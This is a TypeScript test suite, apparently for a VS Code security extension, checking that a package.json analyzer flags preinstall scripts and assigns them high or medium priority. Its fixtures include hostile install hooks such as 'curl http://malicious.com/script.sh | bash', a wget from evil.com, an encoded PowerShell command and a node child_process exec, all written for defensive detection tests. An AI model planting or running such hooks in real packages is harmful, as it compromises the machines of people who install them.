import * as assert from 'assert'
import * as vscode from 'vscode'
import '../../analyzers/agentsFile' // load before to resolve circular dep
import { PackageJsonAnalyzer } from '../../analyzers/packageJson'
import { FindingType } from '../../types'

suite('PackageJsonAnalyzer', () => {

    const fakeUri = vscode.Uri.file('/workspace/package.json')
    let analyzer: PackageJsonAnalyzer

    setup(() => {
        analyzer = new PackageJsonAnalyzer()
    })

    suite('canScanFile', () => {

        test('returns true for package.json', () => {
            assert.strictEqual(analyzer.canScanFile(vscode.Uri.file('/project/package.json')), true)
        })

        test('returns true for nested package.json', () => {
            assert.strictEqual(analyzer.canScanFile(vscode.Uri.file('/project/packages/lib/package.json')), true)
        })

        test('returns false for other json files', () => {
            assert.strictEqual(analyzer.canScanFile(vscode.Uri.file('/project/tsconfig.json')), false)
        })

        test('returns false for similarly named files', () => {
            assert.strictEqual(analyzer.canScanFile(vscode.Uri.file('/project/not-package.json')), false)
        })
    })

    suite('checkPackageJson', () => {

        test('returns empty findings when no scripts', () => {
            const json = { name: 'test-package', version: '1.0.0' }
            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
            assert.strictEqual(findings.length, 0)
        })

        test('returns empty findings when scripts exist but no preinstall', () => {
            const json = {
                scripts: {
                    build: 'tsc',
                    test: 'jest',
                    start: 'node index.js'
                }
            }
            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
            assert.strictEqual(findings.length, 0)
        })

        test('detects preinstall script with high priority for dangerous command', () => {
            const json = {
                scripts: {
                    preinstall: 'curl http://malicious.com/script.sh | bash'
                }
            }
            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
            assert.strictEqual(findings.length, 1)
            assert.strictEqual(findings[0].type, FindingType.PreinstallScript)
            assert.ok(findings[0].name.includes('preinstall'))
            assert.strictEqual(findings[0].priority, 'high')
        })

        test('detects preinstall script with medium priority for non-dangerous command', () => {
            const json = {
                scripts: {
                    preinstall: 'echo hello'
                }
            }
            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
            assert.strictEqual(findings.length, 1)
            assert.strictEqual(findings[0].type, FindingType.PreinstallScript)
            assert.strictEqual(findings[0].priority, 'medium')
        })

        test('detects preinstall with powershell as high priority', () => {
            const json = {
                scripts: {
                    preinstall: 'powershell -EncodedCommand abc123'
                }
            }
            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
            assert.strictEqual(findings.length, 1)
            assert.strictEqual(findings[0].priority, 'high')
        })

        test('detects preinstall with node as high priority', () => {
            const json = {
                scripts: {
                    preinstall: 'node -e "require(\'child_process\').exec(\'malicious\')"'
                }
            }
            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
            assert.strictEqual(findings.length, 1)
            assert.strictEqual(findings[0].priority, 'high')
        })
    })

    suite('checkFile', () => {

        test('parses content and detects preinstall', async () => {
            const content = new TextEncoder().encode(JSON.stringify({
                scripts: {
                    preinstall: 'wget http://evil.com/payload'
                }
            }))
            const findings = await analyzer.checkFile(fakeUri, content)
            assert.strictEqual(findings.length, 1)
            assert.strictEqual(findings[0].type, FindingType.PreinstallScript)
            assert.strictEqual(findings[0].priority, 'high')
        })

        test('returns empty for clean package.json', async () => {
            const content = new TextEncoder().encode(JSON.stringify({
                name: 'safe-package',
                scripts: {
                    build: 'tsc',
                    test: 'jest'
                }
            }))
            const findings = await analyzer.checkFile(fakeUri, content)
            assert.strictEqual(findings.length, 0)
        })
    })
})
